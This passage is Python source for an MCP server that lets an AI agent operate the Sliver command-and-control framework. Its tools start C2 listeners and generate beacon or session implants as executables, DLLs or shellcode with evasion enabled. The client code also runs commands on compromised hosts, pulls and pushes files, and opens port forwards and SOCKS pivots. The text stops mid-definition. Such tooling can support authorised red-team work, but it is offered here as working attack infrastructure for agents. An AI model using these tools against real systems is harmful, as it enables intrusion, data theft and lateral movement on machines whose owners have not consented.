#!/usr/bin/env python3
"""
Agent Opulence - Sliver C2 MCP Server
=====================================
MCP interface for Sliver C2 Framework via gRPC using sliver-py.

Protocol: FastMCP over stdio
Reference: https://github.com/moloch--/sliver-py
"""

import os
import sys
import json
import asyncio
import logging
import hashlib
from typing import Dict, List, Any, Optional
from datetime import datetime, timezone
from pathlib import Path
from enum import Enum

from pydantic import BaseModel, Field, ConfigDict, field_validator
from mcp.server.fastmcp import FastMCP

logging.basicConfig(level=logging.INFO, stream=sys.stderr)
logger = logging.getLogger('sliver-mcp')

# Initialize FastMCP server
mcp = FastMCP("sliver_mcp")

# Sliver availability flag - set during initialize()
SLIVER_AVAILABLE = False


# =============================================================================
# Response Format Enum and Helpers
# =============================================================================

class ResponseFormat(str, Enum):
    """Output format for tool responses."""
    JSON = "json"
    MARKDOWN = "markdown"


def _time_ago(timestamp) -> str:
    """Convert timestamp to human-readable time ago string."""
    try:
        if isinstance(timestamp, str):
            dt = datetime.fromisoformat(timestamp.replace('Z', '+00:00'))
        elif isinstance(timestamp, (int, float)):
            # Unix timestamp in seconds or nanoseconds
            if timestamp > 1e12:
                timestamp = timestamp / 1e9
            dt = datetime.fromtimestamp(timestamp, tz=timezone.utc)
        else:
            return str(timestamp)

        now = datetime.now(timezone.utc)
        diff = now - dt

        if diff.total_seconds() < 60:
            return f"{int(diff.total_seconds())} sec ago"
        elif diff.total_seconds() < 3600:
            return f"{int(diff.total_seconds() / 60)} min ago"
        elif diff.total_seconds() < 86400:
            return f"{int(diff.total_seconds() / 3600)} hr ago"
        else:
            return f"{int(diff.total_seconds() / 86400)} days ago"
    except Exception:
        return str(timestamp) if timestamp else "unknown"


def _format_listeners_markdown(jobs: List[Dict[str, Any]]) -> str:
    """Format listener/job list as markdown."""
    if not jobs:
        return "## Active Listeners (0)\n\nNo active listeners."

    lines = [
        f"## Active Listeners ({len(jobs)})",
        "",
        "| ID | Name | Protocol | Port | Domains |",
        "|----|------|----------|------|---------|"
    ]

    for job in jobs:
        job_id = f"`{job.get('id', '?')}`"
        name = job.get('name', 'unknown')[:20]
        protocol = job.get('protocol', 'unknown')
        port = str(job.get('port', '?'))
        domains = ', '.join(job.get('domains', [])) or '-'
        lines.append(f"| {job_id} | {name} | {protocol} | {port} | {domains} |")

    return "\n".join(lines)


def _format_sessions_markdown(sessions: List[Dict[str, Any]]) -> str:
    """Format session list as markdown."""
    if not sessions:
        return "## Active Sessions (0)\n\nNo active sessions."

    lines = [
        f"## Active Sessions ({len(sessions)})",
        "",
        "| ID | User | Host | OS | Transport | Last Checkin |",
        "|----|------|------|----|-----------|--------------|"
    ]

    for sess in sessions:
        sid = f"`{sess.get('id', '?')[:8]}...`"
        user = sess.get('username', 'unknown')[:15]
        host = sess.get('hostname', 'unknown')[:15]
        os_info = f"{sess.get('os', '?')} {sess.get('arch', '')}"[:12]
        transport = sess.get('transport', 'unknown')
        last_checkin = _time_ago(sess.get('last_checkin'))
        dead = " (DEAD)" if sess.get('is_dead') else ""
        lines.append(f"| {sid} | {user} | {host} | {os_info} | {transport} | {last_checkin}{dead} |")

    return "\n".join(lines)


def _format_beacons_markdown(beacons: List[Dict[str, Any]]) -> str:
    """Format beacon list as markdown."""
    if not beacons:
        return "## Active Beacons (0)\n\nNo active beacons."

    lines = [
        f"## Active Beacons ({len(beacons)})",
        "",
        "| ID | User | Host | OS | Interval | Next Checkin |",
        "|----|------|------|----|----------|--------------|"
    ]

    for beacon in beacons:
        bid = f"`{beacon.get('id', '?')[:8]}...`"
        user = beacon.get('username', 'unknown')[:15]
        host = beacon.get('hostname', 'unknown')[:15]
        os_info = f"{beacon.get('os', '?')} {beacon.get('arch', '')}"[:12]
        interval = f"{beacon.get('interval', '?')}s ({beacon.get('jitter', 0)}%)"
        next_checkin = _time_ago(beacon.get('next_checkin'))
        lines.append(f"| {bid} | {user} | {host} | {os_info} | {interval} | {next_checkin} |")

    return "\n".join(lines)

# Artifacts directory for implants and downloads
ARTIFACTS_DIR = Path("/artifacts")
IMPLANTS_DIR = ARTIFACTS_DIR / "implants"
DOWNLOADS_DIR = ARTIFACTS_DIR / "downloads"


# =============================================================================
# Pydantic Input Models
# =============================================================================

class ListenersListInput(BaseModel):
    """Input model for sliver_listeners_list tool."""
    model_config = ConfigDict(
        str_strip_whitespace=True,
        validate_assignment=True,
        extra='forbid'
    )

    response_format: ResponseFormat = Field(
        default=ResponseFormat.JSON,
        description="Output format: 'json' for structured data, 'markdown' for human-readable"
    )


class ListenerStartInput(BaseModel):
    """Input model for sliver_listener_start tool."""
    model_config = ConfigDict(
        str_strip_whitespace=True,
        validate_assignment=True,
        extra='forbid'
    )

    protocol: str = Field(
        ...,
        description="Listener protocol: mtls, https, http, or dns"
    )
    host: str = Field(
        default="0.0.0.0",
        description="Host/interface to bind to (default: 0.0.0.0)"
    )
    port: int = Field(
        ...,
        description="Port to listen on (1-65535)",
        ge=1,
        le=65535
    )
    domain: Optional[str] = Field(
        default=None,
        description="Domain for HTTPS/DNS listeners (optional)"
    )
    persistent: bool = Field(
        default=False,
        description="Register as persistent job that auto-starts with server"
    )

    @field_validator('protocol')
    @classmethod
    def validate_protocol(cls, v: str) -> str:
        allowed = ['mtls', 'https', 'http', 'dns', 'wg']
        if v.lower() not in allowed:
            raise ValueError(f"Protocol must be one of: {', '.join(allowed)}")
        return v.lower()


class ListenerStopInput(BaseModel):
    """Input model for sliver_listener_stop tool."""
    model_config = ConfigDict(
        str_strip_whitespace=True,
        validate_assignment=True,
        extra='forbid'
    )

    job_id: int = Field(
        ...,
        description="Job ID of the listener to stop"
    )


class ImplantGenerateInput(BaseModel):
    """Input model for sliver_implant_generate tool."""
    model_config = ConfigDict(
        str_strip_whitespace=True,
        validate_assignment=True,
        extra='forbid'
    )

    name: str = Field(
        ...,
        description="Implant name",
        min_length=1
    )
    os: str = Field(
        ...,
        description="Target operating system: windows, linux, or darwin"
    )
    arch: str = Field(
        ...,
        description="Target architecture: amd64, 386, or arm64"
    )
    c2_urls: List[str] = Field(
        ...,
        description="C2 callback URLs (e.g., mtls://10.10.14.32:8888, https://cdn.example.com:443)"
    )
    format: str = Field(
        default="exe",
        description="Output format: exe, shared, shellcode, or service"
    )
    beacon: bool = Field(
        default=True,
        description="Generate beacon implant (True) or session implant (False)"
    )
    beacon_interval: int = Field(
        default=60,
        description="Beacon check-in interval in seconds (only for beacons)"
    )
    jitter: int = Field(
        default=30,
        description="Beacon jitter percentage 0-100 (only for beacons)"
    )
    evasion: bool = Field(
        default=True,
        description="Enable evasion features"
    )

    @field_validator('os')
    @classmethod
    def validate_os(cls, v: str) -> str:
        allowed = ['windows', 'linux', 'darwin']
        if v.lower() not in allowed:
            raise ValueError(f"OS must be one of: {', '.join(allowed)}")
        return v.lower()

    @field_validator('arch')
    @classmethod
    def validate_arch(cls, v: str) -> str:
        allowed = ['amd64', '386', 'arm64']
        if v.lower() not in allowed:
            raise ValueError(f"Arch must be one of: {', '.join(allowed)}")
        return v.lower()

    @field_validator('format')
    @classmethod
    def validate_format(cls, v: str) -> str:
        allowed = ['exe', 'shared', 'shellcode', 'service']
        if v.lower() not in allowed:
            raise ValueError(f"Format must be one of: {', '.join(allowed)}")
        return v.lower()


class SessionsListInput(BaseModel):
    """Input model for sliver_sessions_list tool."""
    model_config = ConfigDict(
        str_strip_whitespace=True,
        validate_assignment=True,
        extra='forbid'
    )

    response_format: ResponseFormat = Field(
        default=ResponseFormat.JSON,
        description="Output format: 'json' for structured data, 'markdown' for human-readable"
    )


class BeaconsListInput(BaseModel):
    """Input model for sliver_beacons_list tool."""
    model_config = ConfigDict(
        str_strip_whitespace=True,
        validate_assignment=True,
        extra='forbid'
    )

    response_format: ResponseFormat = Field(
        default=ResponseFormat.JSON,
        description="Output format: 'json' for structured data, 'markdown' for human-readable"
    )


class ExecuteInput(BaseModel):
    """Input model for sliver_execute tool."""
    model_config = ConfigDict(
        str_strip_whitespace=True,
        validate_assignment=True,
        extra='forbid'
    )

    session_id: str = Field(
        ...,
        description="Session ID to execute command on",
        min_length=1
    )
    command: str = Field(
        ...,
        description="Command/executable to run",
        min_length=1
    )
    args: List[str] = Field(
        default_factory=list,
        description="Command arguments"
    )
    output: bool = Field(
        default=True,
        description="Capture command output"
    )


class DownloadInput(BaseModel):
    """Input model for sliver_download tool."""
    model_config = ConfigDict(
        str_strip_whitespace=True,
        validate_assignment=True,
        extra='forbid'
    )

    session_id: str = Field(
        ...,
        description="Session ID to download from",
        min_length=1
    )
    remote_path: str = Field(
        ...,
        description="Path to file on target system",
        min_length=1
    )
    filename: Optional[str] = Field(
        default=None,
        description="Local filename override (optional, defaults to remote filename)"
    )


class UploadInput(BaseModel):
    """Input model for sliver_upload tool."""
    model_config = ConfigDict(
        str_strip_whitespace=True,
        validate_assignment=True,
        extra='forbid'
    )

    session_id: str = Field(
        ...,
        description="Session ID to upload to",
        min_length=1
    )
    local_path: str = Field(
        ...,
        description="Path to local file to upload",
        min_length=1
    )
    remote_path: str = Field(
        ...,
        description="Destination path on target system",
        min_length=1
    )


class PortfwdAddInput(BaseModel):
    """Input model for sliver_portfwd_add tool."""
    model_config = ConfigDict(
        str_strip_whitespace=True,
        validate_assignment=True,
        extra='forbid'
    )

    session_id: str = Field(
        ...,
        description="Session ID to create port forward through",
        min_length=1
    )
    local_port: int = Field(
        ...,
        description="Local port to listen on",
        ge=1,
        le=65535
    )
    remote_host: str = Field(
        ...,
        description="Remote host to forward to",
        min_length=1
    )
    remote_port: int = Field(
        ...,
        description="Remote port to forward to",
        ge=1,
        le=65535
    )


class SocksStartInput(BaseModel):
    """Input model for sliver_socks_start tool."""
    model_config = ConfigDict(
        str_strip_whitespace=True,
        validate_assignment=True,
        extra='forbid'
    )

    session_id: str = Field(
        ...,
        description="Session ID to create SOCKS proxy through",
        min_length=1
    )
    port: int = Field(
        default=1080,
        description="Local port for SOCKS proxy (default: 1080)",
        ge=1,
        le=65535
    )


# =============================================================================
# SliverMCPClient Class
# =============================================================================

class SliverMCPClient:
    """Sliver C2 gRPC client wrapper using sliver-py.

    Design: Uses sliver-py library for gRPC communication with Sliver server.
    Connection is established using operator configuration files (mTLS).
    """

    def __init__(self):
        """Initialize the SliverMCPClient.

        Client is lazily initialized via connect() to handle
        the case where sliver-py is not installed or server unreachable.
        """
        self.client = None  # Will be sliver.SliverClient instance
        self.config = None  # Will be SliverClientConfig instance
        self.connected = False
        self._init_attempted = False
        self._init_error: Optional[str] = None

        # Config path from environment or default
        self.config_path = os.environ.get(
            "SLIVER_CONFIG",
            "/root/.sliver-client/configs/default.cfg"
        )

        # Optional host/port overrides
        self.host_override = os.environ.get("SLIVER_HOST")
        self.port_override = os.environ.get("SLIVER_PORT")

        # Ensure artifact directories exist
        IMPLANTS_DIR.mkdir(parents=True, exist_ok=True)
        DOWNLOADS_DIR.mkdir(parents=True, exist_ok=True)

    async def connect(self) -> bool:
        """Connect to Sliver server using operator config.

        Returns:
            True on successful connection, False otherwise.
        """
        global SLIVER_AVAILABLE

        # Already connected
        if self.connected and self.client is not None:
            return True

        # Already attempted and failed - don't retry
        if self._init_attempted and not self.connected:
            return False

        self._init_attempted = True

        try:
            # Import sliver-py
            from sliver import SliverClientConfig, SliverClient

            # Parse operator config file
            if not os.path.exists(self.config_path):
                self._init_error = f"Sliver config not found: {self.config_path}"
                logger.error(self._init_error)
                SLIVER_AVAILABLE = False
                return False

            logger.info(f"Loading Sliver config from: {self.config_path}")
            self.config = SliverClientConfig.parse_config_file(self.config_path)

            # Apply host/port overrides if specified
            if self.host_override:
                self.config.lhost = self.host_override
                logger.info(f"Using host override: {self.host_override}")
            if self.port_override:
                self.config.lport = int(self.port_override)
                logger.info(f"Using port override: {self.port_override}")

            # Create client and connect
            self.client = SliverClient(self.config)
            await self.client.connect()

            self.connected = True
            SLIVER_AVAILABLE = True
            logger.info("Connected to Sliver server successfully")

            # Log server version
            try:
                version = await self.client.version()
                logger.info(f"Sliver server version: {version.Major}.{version.Minor}.{version.Patch}")
            except Exception as e:
                logger.warning(f"Could not get server version: {e}")

            return True

        except ImportError as e:
            self._init_error = f"sliver-py not installed: {e}"
            logger.error(self._init_error)
            SLIVER_AVAILABLE = False
            return False

        except FileNotFoundError as e:
            self._init_error = f"Sliver config file not found: {e}"
            logger.error(self._init_error)
            SLIVER_AVAILABLE = False
            return False

        except Exception as e:
            self._init_error = f"Failed to connect to Sliver: {e}"
            logger.error(self._init_error)
            SLIVER_AVAILABLE = False
            return False

    def _ensure_connected(self):
        """Raise if not connected."""
        if not self.connected or self.client is None:
            error_msg = self._init_error or "Not connected to Sliver server"
            raise RuntimeError(error_msg)

    # -------------------------------------------------------------------------
    # Listener/Job Methods
    # -------------------------------------------------------------------------

    async def list_jobs(self) -> List[Dict[str, Any]]:
        """List active Sliver jobs (listeners).

        Returns:
            List of job dictionaries with id, name, protocol, port, etc.
        """
        self._ensure_connected()

        try:
            jobs = await self.client.jobs()
            result = []

            for job in jobs:
                result.append({
                    "id": job.ID,
                    "name": job.Name,
                    "description": job.Description,
                    "protocol": job.Protocol,
                    "port": job.Port,
                    "domains": list(job.Domains) if job.Domains else [],
                })

            return result

        except Exception as e:
            logger.error(f"Failed to list jobs: {e}")
            raise

    async def start_listener(
        self,
        protocol: str,
        host: str,
        port: int,
        domain: Optional[str] = None,
        persistent: bool = False
    ) -> Dict[str, Any]:
        """Start a new listener.

        Args:
            protocol: Listener protocol (mtls, https, http, dns)
            host: Host to bind to
            port: Port to bind to
            domain: Domain for HTTPS/DNS listeners
            persistent: Auto-start with server

        Returns:
            Dict with job info
        """
        self._ensure_connected()

        try:
            job = None

            if protocol == "mtls":
                job = await self.client.start_mtls_listener(
                    host=host,
                    port=port,
                    persistent=persistent
                )
            elif protocol == "https":
                job = await self.client.start_https_listener(
                    host=host,
                    port=port,
                    domain=domain or "",
                    persistent=persistent
                )
            elif protocol == "http":
                job = await self.client.start_http_listener(
                    host=host,
                    port=port,
                    domain=domain or "",
                    persistent=persistent
                )
            elif protocol == "dns":
                if not domain:
                    raise ValueError("DNS listener requires a domain")
                job = await self.client.start_dns_listener(
                    domains=[domain],
                    host=host,
                    port=port,
                    persistent=persistent
                )
            elif protocol == "wg":
                job = await self.client.start_wg_listener(
                    host=host,
                    port=port,
                    persistent=persistent
                )
            else:
                raise ValueError(f"Unknown protocol: {protocol}")

            return {
                "success": True,
                "job_id": job.JobID,
                "protocol": protocol,
                "host": host,
                "port": port,
                "domain": domain,
                "started_at": datetime.now(timezone.utc).isoformat()
            }

        except Exception as e:
            logger.error(f"Failed to start {protocol} listener: {e}")
            raise

    async def stop_listener(self, job_id: int) -> Dict[str, Any]:
        """Stop a listener by job ID.

        Args:
            job_id: Job ID to stop

        Returns:
            Dict confirming stop
        """
        self._ensure_connected()

        try:
            await self.client.kill_job(job_id)

            return {
                "success": True,
                "job_id": job_id,
                "status": "stopped",
                "stopped_at": datetime.now(timezone.utc).isoformat()
            }

        except Exception as e:
            logger.error(f"Failed to stop job {job_id}: {e}")
            raise

    # -------------------------------------------------------------------------
    # Implant Generation Methods
    # -------------------------------------------------------------------------

    async def generate_implant(
        self,
        name: str,
        os: str,
        arch: str,
        c2_urls: List[str],
        format: str = "exe",
        beacon: bool = True,
        beacon_interval: int = 60,
        jitter: int = 30,
        evasion: bool = True
    ) -> Dict[str, Any]:
        """Generate a Sliver implant.

        Args:
            name: Implant name
            os: Target OS (windows, linux, darwin)
            arch: Target architecture (amd64, 386, arm64)
            c2_urls: C2 callback URLs
            format: Output format (exe, shared, shellcode, service)
            beacon: Generate beacon (True) or session (False)
            beacon_interval: Beacon interval in seconds
            jitter: Beacon jitter percentage
            evasion: Enable evasion features

        Returns:
            Dict with implant info including file path and sha256
        """
        self._ensure_connected()

        try:
            # Determine file extension
            ext_map = {
                ("exe", "windows"): ".exe",
                ("exe", "linux"): "",
                ("exe", "darwin"): "",
                ("shared", "windows"): ".dll",
                ("shared", "linux"): ".so",
                ("shared", "darwin"): ".dylib",
                ("shellcode", "windows"): ".bin",
                ("shellcode", "linux"): ".bin",
                ("shellcode", "darwin"): ".bin",
                ("service", "windows"): ".exe",
                ("service", "linux"): "",
                ("service", "darwin"): "",
            }
            ext = ext_map.get((format, os), "")
            filename = f"{name}{ext}"
            file_path = IMPLANTS_DIR / filename

            # Build implant config
            # Parse C2 URLs into proper format
            mtls_c2 = []
            http_c2 = []
            dns_c2 = []
            wg_c2 = []

            for url in c2_urls:
                if url.startswith("mtls://"):
                    mtls_c2.append(url)
                elif url.startswith("https://") or url.startswith("http://"):
                    http_c2.append(url)
                elif url.startswith("dns://"):
                    dns_c2.append(url)
                elif url.startswith("wg://"):
                    wg_c2.append(url)
                else:
                    # Default to mtls if no scheme
                    mtls_c2.append(f"mtls://{url}")

            if beacon:
                # Generate beacon implant
                implant = await self.client.generate_beacon(
                    name=name,
                    goos=os,
                    goarch=arch,
                    mtls_c2=mtls_c2,
                    http_c2=http_c2,
                    dns_c2=dns_c2,
                    wg_c2=wg_c2,
                    format=format,
                    beacon_interval=beacon_interval,
                    beacon_jitter=jitter,
                    evasion=evasion
                )
            else:
                # Generate session implant
                implant = await self.client.generate(
                    name=name,
                    goos=os,
                    goarch=arch,
                    mtls_c2=mtls_c2,
                    http_c2=http_c2,
                    dns_c2=dns_c2,
                    wg_c2=wg_c2,
                    format=format,
                    evasion=evasion
                )

            # Get the implant file data
            implant_data = implant.File.Data

            # Save to artifacts directory
            with open(file_path, 'wb') as f:
                f.write(implant_data)

            # Calculate SHA256
            sha256 = hashlib.sha256(implant_data).hexdigest()
            size_bytes = len(implant_data)

            logger.info(f"Generated implant: {file_path} ({size_bytes} bytes, sha256: {sha256[:16]}...)")

            return {
                "success": True,
                "name": name,
                "os": os,
                "arch": arch,
                "format": format,
                "type": "beacon" if beacon else "session",
                "c2": c2_urls,
                "file_path": str(file_path),
                "sha256": sha256,
                "size_bytes": size_bytes,
                "generated_at": datetime.now(timezone.utc).isoformat(),
                "config": {
                    "beacon_interval": beacon_interval if beacon else None,
                    "jitter": jitter if beacon else None,
                    "evasion": evasion
                }
            }

        except Exception as e:
            logger.error(f"Failed to generate implant: {e}")
            raise

    # -------------------------------------------------------------------------
    # Session Methods
    # -------------------------------------------------------------------------

    async def list_sessions(self) -> List[Dict[str, Any]]:
        """List active implant sessions.

        Returns:
            List of session dictionaries
        """
        self._ensure_connected()

        try:
            sessions = await self.client.sessions()
            result = []

            for session in sessions:
                result.append({
                    "id": session.ID,
                    "name": session.Name,
                    "hostname": session.Hostname,
                    "username": session.Username,
                    "uid": session.UID,
                    "gid": session.GID,
                    "os": session.OS,
                    "arch": session.Arch,
                    "transport": session.Transport,
                    "remote_address": session.RemoteAddress,
                    "pid": session.PID,
                    "filename": session.Filename,
                    "last_checkin": session.LastCheckin,
                    "active_c2": session.ActiveC2,
                    "is_dead": session.IsDead,
                })

            return result

        except Exception as e:
            logger.error(f"Failed to list sessions: {e}")
            raise

    async def execute(
        self,
        session_id: str,
        command: str,
        args: List[str] = None,
        output: bool = True
    ) -> Dict[str, Any]:
        """Execute a command on a session.

        Args:
            session_id: Session ID
            command: Command/executable to run
            args: Command arguments
            output: Whether to capture output

        Returns:
            Dict with command output and status
        """
        self._ensure_connected()

        try:
            # Get interactive session
            interact = await self.client.interact_session(session_id)

            # Execute command
            result = await interact.execute(
                exe=command,
                args=args or [],
                output=output
            )

            return {
                "session_id": session_id,
                "command": command,
                "args": args or [],
                "stdout": result.Stdout.decode('utf-8', errors='replace') if result.Stdout else "",
                "stderr": result.Stderr.decode('utf-8', errors='replace') if result.Stderr else "",
                "status": result.Status,
                "executed_at": datetime.now(timezone.utc).isoformat()
            }

        except Exception as e:
            logger.error(f"Failed to execute command on session {session_id}: {e}")
            raise

    async def download(
        self,
        session_id: str,
        remote_path: str,
        filename: Optional[str] = None
    ) -> Dict[str, Any]:
        """Download a file from a session.

        Args:
            session_id: Session ID
            remote_path: Path to file on target
            filename: Local filename override

        Returns:
            Dict with download info
        """
        self._ensure_connected()

        try:
            # Get interactive session
            interact = await self.client.interact_session(session_id)

            # Download file
            result = await interact.download(remote_path)

            # Determine local filename
            if filename:
                local_filename = filename
            else:
                local_filename = os.path.basename(remote_path)

            # Save to downloads directory
            local_path = DOWNLOADS_DIR / f"{session_id}_{local_filename}"

            with open(local_path, 'wb') as f:
                f.write(result.Data)

            sha256 = hashlib.sha256(result.Data).hexdigest()
            size_bytes = len(result.Data)

            logger.info(f"Downloaded: {remote_path} -> {local_path} ({size_bytes} bytes)")

            return {
                "success": True,
                "session_id": session_id,
                "remote_path": remote_path,
                "local_path": str(local_path),
                "sha256": sha256,
                "size_bytes": size_bytes,
                "downloaded_at": datetime.now(timezone.utc).isoformat()
            }

        except Exception as e:
            logger.error(f"Failed to download from session {session_id}: {e}")
            raise

    async def upload(
        self,
        session_id: str,
        local_path: str,
        remote_path: str
    ) -> Dict[str, Any]:
        """Upload a file to a session.

        Args:
            session_id: Session ID
            local_path: Path to local file
            remote_path: Destination path on target

        Returns:
            Dict with upload info
        """
        self._ensure_connected()

        try:
            # Read local file
            local_file = Path(local_path)
            if not local_file.exists():
                raise FileNotFoundError(f"Local file not found: {local_path}")

            with open(local_file, 'rb') as f:
                data = f.read()

            # Get interactive session
            interact = await self.client.interact_session(session_id)

            # Upload file
            result = await interact.upload(remote_path, data)

            sha256 = hashlib.sha256(data).hexdigest()
            size_bytes = len(data)

            logger.info(f"Uploaded: {local_path} -> {remote_path} ({size_bytes} bytes)")

            return {
                "success": True,
                "session_id": session_id,
                "local_path": local_path,
                "remote_path": remote_path,
                "sha256": sha256,
                "size_bytes": size_bytes,
                "uploaded_at": datetime.now(timezone.utc).isoformat()
            }

        except Exception as e:
            logger.error(f"Failed to upload to session {session_id}: {e}")
            raise

    # -------------------------------------------------------------------------
    # Beacon Methods
    # -------------------------------------------------------------------------

    async def list_beacons(self) -> List[Dict[str, Any]]:
        """List beacon implants.

        Returns:
            List of beacon dictionaries
        """
        self._ensure_connected()

        try:
            beacons = await self.client.beacons()
            result = []

            for beacon in beacons:
                result.append({
                    "id": beacon.ID,
                    "name": beacon.Name,
                    "hostname": beacon.Hostname,
                    "username": beacon.Username,
                    "uid": beacon.UID,
                    "gid": beacon.GID,
                    "os": beacon.OS,
                    "arch": beacon.Arch,
                    "transport": beacon.Transport,
                    "remote_address": beacon.RemoteAddress,
                    "pid": beacon.PID,
                    "filename": beacon.Filename,
                    "last_checkin": beacon.LastCheckin,
                    "active_c2": beacon.ActiveC2,
                    "interval": beacon.Interval,
                    "jitter": beacon.Jitter,
                    "next_checkin": beacon.NextCheckin,
                })

            return result

        except Exception as e:
            logger.error(f"Failed to list beacons: {e}")
            raise

    # -------------------------------------------------------------------------
    # Network Methods (Port Forward, SOCKS)
    # -------------------------------------------------------------------------

    async def portfwd_add(
        self,
        session_id: str,
        local_port: int,
        remote_host: str,
        remote_port: int
    ) -> Dict[str, Any]:
        """Add a port forward through a session.

        Args:
            session_id: Session ID
            local_port: Local port to listen on
            remote_host: Remote host to forward to
            remote_port: Remote port to forward to

        Returns:
            Dict with port forward info
        """
        self._ensure_connected()

        try:
            # Get interactive session
            interact = await self.client.interact_session(session_id)

            # Start port forward
            result = await interact.portfwd_add(
                local_port=local_port,
                remote_host=remote_host,
                remote_port=remote_port
            )

            return {
                "success": True,
                "session_id": session_id,
                "local_port": local_port,
                "remote_host": remote_host,
                "remote_port": remote_port,
                "portfwd_id": result.ID if hasattr(result, 'ID') else None,
                "created_at": datetime.now(timezone.utc).isoformat()
            }

        except Exception as e:
            logger.error(f"Failed to add port forward: {e}")
            raise

    async def socks_start(
        self,
        session_id: str,
        port: int = 1080
    ) -> Dict[str, Any]:
        """Start a SOCKS proxy through a session.

        Args:
            session_id: Session ID
            port: Local port for SOCKS proxy

        Returns:
            Dict with SOCKS proxy info
        """
        self._ensure_connected()

        try:
            # Get interactive session
            interact = await self.client.interact_session(session_id)

            # Start SOCKS proxy
            result = await interact.socks_start(port=port)

            return {
                "success": True,
                "session_id": session_id,
                "port": port,
                "socks_id": result.ID if hasattr(result, 'ID') else None,
                "created_at": datetime.now(timezone.utc).isoformat()
            }

        except Exception as e:
            logger.error(f"Failed to start SOCKS proxy: {e}")
            raise


# =============================================================================
# Global Client and Helpers
# =============================================================================

# Global client
client: Optional[SliverMCPClient] = None


def get_client() -> SliverMCPClient:
    """Get or create Sliver client.

    Note: The client must be connected with await client.connect()
    before use. This is done during MCP initialization.
    """
    global client
    if client is None:
        client = SliverMCPClient()
    return client


async def ensure_client_connected() -> SliverMCPClient:
    """Get Sliver client and ensure connection was attempted.

    Attempts connection if not already done. Does not raise on
    failure - individual tool methods will raise with appropriate
    error messages if Sliver is unavailable.

    Returns:
        SliverMCPClient instance (may not be functional if connection failed)
    """
    sliver = get_client()
    if not sliver._init_attempted:
        await sliver.connect()
    return sliver


# =============================================================================
# FastMCP Tool Definitions
# =============================================================================

@mcp.tool(
    name="sliver_listeners_list",
    annotations={
        "title": "List Active Listeners",
        "readOnlyHint": True,
        "destructiveHint": False,
        "idempotentHint": True,
        "openWorldHint": True
    }
)
async def sliver_listeners_list(params: ListenersListInput) -> str:
    """List all active Sliver listeners (jobs).

    Returns active listeners/jobs running on the Sliver server,
    including mTLS, HTTPS, HTTP, and DNS listeners.

    Args:
        params (ListenersListInput): Validated input parameters containing:
            - response_format (ResponseFormat): Output format (json/markdown)

    Returns:
        str: JSON or Markdown formatted list of active listeners
    """
    sliver = await ensure_client_connected()

    try:
        result = await sliver.list_jobs()

        if params.response_format == ResponseFormat.MARKDOWN:
            return _format_listeners_markdown(result)
        return json.dumps(result, indent=2)
    except RuntimeError as e:
        return json.dumps({"error": "not_connected", "message": str(e)}, indent=2)
    except Exception as e:
        logger.error(f"sliver_listeners_list failed: {e}")
        return json.dumps({"error": "internal_error", "message": str(e)}, indent=2)


@mcp.tool(
    name="sliver_listener_start",
    annotations={
        "title": "Start Listener",
        "readOnlyHint": False,
        "destructiveHint": False,
        "idempotentHint": False,
        "openWorldHint": True
    }
)
async def sliver_listener_start(params: ListenerStartInput) -> str:
    """Start a new Sliver listener (mTLS, HTTPS, HTTP, or DNS).

    Creates a new listener on the Sliver server for incoming implant connections.

    Args:
        params (ListenerStartInput): Validated input parameters containing:
            - protocol (str): mtls, https, http, dns, or wg
            - host (str): Host/interface to bind to
            - port (int): Port to listen on
            - domain (Optional[str]): Domain for HTTPS/DNS listeners
            - persistent (bool): Auto-start with server

    Returns:
        str: JSON-formatted response:
            {
                "success": bool,
                "job_id": int,
                "protocol": str,
                "host": str,
                "port": int,
                "started_at": str
            }
    """
    sliver = await ensure_client_connected()

    try:
        result = await sliver.start_listener(
            protocol=params.protocol,
            host=params.host,
            port=params.port,
            domain=params.domain,
            persistent=params.persistent
        )
        return json.dumps(result, indent=2)
    except RuntimeError as e:
        return json.dumps({"error": "not_connected", "message": str(e)}, indent=2)
    except ValueError as e:
        return json.dumps({"error": "invalid_input", "message": str(e)}, indent=2)
    except Exception as e:
        logger.error(f"sliver_listener_start failed: {e}")
        return json.dumps({"error": "internal_error", "message": str(e)}, indent=2)


@mcp.tool(
    name="sliver_listener_stop",
    annotations={
        "title": "Stop Listener",
        "readOnlyHint": False,
        "destructiveHint": True,
        "idempotentHint": False,
        "openWorldHint": True
    }
)
async def sliver_listener_stop(params: ListenerStopInput) -> str:
    """Stop a Sliver listener by job ID.

    Terminates an active listener on the Sliver server.

    Args:
        params (ListenerStopInput): Validated input parameters containing:
            - job_id (int): Job ID of the listener to stop

    Returns:
        str: JSON-formatted response:
            {
                "success": bool,
                "job_id": int,
                "status": str,
                "stopped_at": str
            }
    """
    sliver = await ensure_client_connected()

    try:
        result = await sliver.stop_listener(job_id=params.job_id)
        return json.dumps(result, indent=2)
    except RuntimeError as e:
        return json.dumps({"error": "not_connected", "message": str(e)}, indent=2)
    except Exception as e:
        logger.error(f"sliver_listener_stop failed: {e}")
        return json.dumps({"error": "internal_error", "message": str(e)}, indent=2)


@mcp.tool(
    name="sliver_implant_generate",
    annotations={
        "title": "Generate Implant",
        "readOnlyHint": False,
        "destructiveHint": False,
        "idempotentHint": False,
        "openWorldHint": True
    }
)
async def sliver_implant_generate(params: ImplantGenerateInput) -> str:
    """Generate a Sliver implant (beacon or session).

    Generates a new implant binary with the specified configuration.
    The implant is saved to /artifacts/implants/ directory.

    Args:
        params (ImplantGenerateInput): Validated input parameters containing:
            - name (str): Implant name
            - os (str): Target OS (windows, linux, darwin)
            - arch (str): Target architecture (amd64, 386, arm64)
            - c2_urls (List[str]): C2 callback URLs
            - format (str): Output format (exe, shared, shellcode, service)
            - beacon (bool): Generate beacon (True) or session (False)
            - beacon_interval (int): Beacon check-in interval in seconds
            - jitter (int): Beacon jitter percentage
            - evasion (bool): Enable evasion features

    Returns:
        str: JSON-formatted response:
            {
                "success": bool,
                "name": str,
                "os": str,
                "arch": str,
                "format": str,
                "type": str,           # "beacon" or "session"
                "file_path": str,      # Path to implant file
                "sha256": str,         # SHA256 hash
                "size_bytes": int,     # File size
                "generated_at": str    # ISO timestamp
            }
    """
    sliver = await ensure_client_connected()

    try:
        result = await sliver.generate_implant(
            name=params.name,
            os=params.os,
            arch=params.arch,
            c2_urls=params.c2_urls,
            format=params.format,
            beacon=params.beacon,
            beacon_interval=params.beacon_interval,
            jitter=params.jitter,
            evasion=params.evasion
        )
        return json.dumps(result, indent=2)
    except RuntimeError as e:
        return json.dumps({"error": "not_connected", "message": str(e)}, indent=2)
    except Exception as e:
        logger.error(f"sliver_implant_generate failed: {e}")
        return json.dumps({"error": "internal_error", "message": str(e)}, indent=2)


@mcp.tool(
    name="sliver_sessions_list",
    annotations={
